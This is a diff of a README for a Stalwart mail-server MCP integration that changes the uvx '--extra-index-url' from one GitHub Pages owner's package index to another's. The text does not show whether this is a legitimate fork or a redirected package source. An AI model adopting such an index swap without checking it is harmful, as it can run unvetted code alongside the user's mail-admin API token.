@@ -9,7 +9,7 @@ MCP server for [Stalwart](https://stalw.art/) mail server.
   "mcpServers": {
     "stalwart": {
       "command": "uvx",
-      "args": ["--refresh", "--extra-index-url", "https://nikitatsym.github.io/stalwart-mcp/simple", "stalwart-mcp"],
+      "args": ["--refresh", "--extra-index-url", "https://it-dnanu-de.github.io/stalwart-mcp/simple", "stalwart-mcp"],
       "env": {
         "STALWART_URL": "https://mail.example.com",
         "STALWART_TOKEN": "your-api-key"
